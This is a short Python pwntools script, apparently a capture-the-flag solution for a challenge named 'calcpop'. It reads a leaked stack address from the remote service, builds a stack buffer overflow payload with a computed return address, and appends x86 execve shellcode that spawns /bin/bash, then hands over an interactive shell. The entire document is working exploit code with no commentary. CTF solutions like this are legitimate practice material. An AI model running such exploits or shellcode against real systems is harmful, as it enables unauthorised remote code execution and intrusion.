from pwn import *
#p = process('./calcpop')
p = remote('calcpop-4gh07blg.9447.plumbing', 9447)
p.sendline('')
p.recvuntil('was')
data = p.recv(1024)
stack = int(data[data.find('0x')+2:], 16)
print hex(stack)
eip = stack + 0xa0

shellcode = "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

payload  = ''
payload += 'a'*0x98
payload += 'b'*0x4
payload += p32(eip)
payload += shellcode
p.sendline(payload)
p.sendline('201526 1')
p.interactive()
